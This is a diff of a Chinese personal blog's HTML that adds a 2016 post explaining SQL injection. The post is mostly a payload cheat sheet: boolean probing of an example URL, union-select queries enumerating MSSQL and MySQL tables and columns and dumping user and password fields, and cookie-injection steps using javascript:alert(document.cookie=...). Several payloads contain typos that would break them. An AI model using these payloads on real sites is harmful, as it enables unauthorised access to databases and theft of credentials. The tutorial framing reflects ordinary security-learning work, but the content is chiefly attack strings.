@@ -86,15 +86,37 @@
 
 
 
-<meta name="description" content="WELCOME TO MY TINY WORKSPACE!!!">
-<meta property="og:type" content="website">
-<meta property="og:title" content="个人博客">
-<meta property="og:url" content="http://burinicc.cn/index.html">
+<meta name="description" content="SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。SQL注入基础1.试探 1=1，1=2
+http://example.asp?id=49
+http://example.asp?id=49 and 1=1
+http://example.asp?id=49 and 1=2
+可以注入的表现：
+正常显示
+正常显示
+提示BOF或E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入问题详解">
+<meta property="og:url" content="http://burinicc.cn/2016/12/01/sql注入问题详解/index.html">
 <meta property="og:site_name" content="个人博客">
-<meta property="og:description" content="WELCOME TO MY TINY WORKSPACE!!!">
+<meta property="og:description" content="SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。SQL注入基础1.试探 1=1，1=2
+http://example.asp?id=49
+http://example.asp?id=49 and 1=1
+http://example.asp?id=49 and 1=2
+可以注入的表现：
+正常显示
+正常显示
+提示BOF或E">
+<meta property="og:updated_time" content="2016-12-01T03:35:16.877Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="个人博客">
-<meta name="twitter:description" content="WELCOME TO MY TINY WORKSPACE!!!">
+<meta name="twitter:title" content="sql注入问题详解">
+<meta name="twitter:description" content="SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。SQL注入基础1.试探 1=1，1=2
+http://example.asp?id=49
+http://example.asp?id=49 and 1=1
+http://example.asp?id=49 and 1=2
+可以注入的表现：
+正常显示
+正常显示
+提示BOF或E">
 
 
 
@@ -122,13 +144,13 @@
 
 
 
-  <link rel="canonical" href="http://burinicc.cn/"/>
+  <link rel="canonical" href="http://burinicc.cn/2016/12/01/sql注入问题详解/"/>
 
 
 
 
 
-  <title> 个人博客 </title>
+  <title> sql注入问题详解 | 个人博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -149,9 +171,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -293,9 +313,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -328,10 +348,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016/12/01/sql注入问题详解/" itemprop="url">
-                  sql注入问题详解
-                </a>
+                sql注入问题详解
               
             
           </h1>
@@ -387,8 +404,7 @@
       
 
       
-        
-          <p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
+        <p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
 <pre><code>http://example.asp?id=49
 http://example.asp?id=49 and 1=1
 http://example.asp?id=49 and 1=2
@@ -427,23 +443,29 @@ http://example.asp?id=49 and 1=2
 表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
 字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
 根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
-</code></pre><p>ASSESS<br>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/12/01/sql注入问题详解/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+</code></pre><p>ASSESS<br><a id="more"></a><br>    试探1=1 1=2<br>    环境监测and ord(mid(version(),1,1))&gt;51正常则为mysql4以上版本，可以union查询union select 1,version(),3<br>    确定字段数order by 13<br>    判断精确字段and 1=2 union select 1,2,3,4正常返回在页面中<br>    爆数据库名and 1=2 union select 1,user(),3,database()正常返回在页面中<br>    爆表and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = ‘blah’结果返回在2字段<br>    爆字段and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=’users’ and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=’users’<br>    爆数据and 1=2 union select 1,user,3,password form phptest.users</p>
+<p>cookie注入</p>
+<pre><code>在原地址加单引号
+去掉id值，页面出错，构造cookie语句：javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=1&quot;))会弹窗
+关闭弹窗，去掉id访问，页面正常
+猜测字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 order by 5&quot;))点击确认，去掉id访问，页面正常则正常
+判断回显位javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,2,3,4 from admin&quot;))点击确认，去掉id访问，页面正常则正常
+猜解user password字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,user,3,4 from admin&quot;))
+</code></pre>
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
@@ -452,23 +474,40 @@ http://example.asp?id=49 and 1=2
       
 
       
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/12/01/tomcat-内存溢出三种解决方式/" rel="next" title="tomcat 内存溢出三种解决方式">
+                <i class="fa fa-chevron-left"></i> tomcat 内存溢出三种解决方式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
 
       
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+    <div class="post-spread">
+      
+        
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
 
+      
+    </div>
+  </div>
 
 
           </div>
@@ -476,6 +515,14 @@ http://example.asp?id=49 and 1=2
 
 
           
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/12/01/sql注入问题详解/"
+           data-title="sql注入问题详解" data-url="http://burinicc.cn/2016/12/01/sql注入问题详解/">
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -690,6 +737,10 @@ http://example.asp?id=49 and 1=2
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
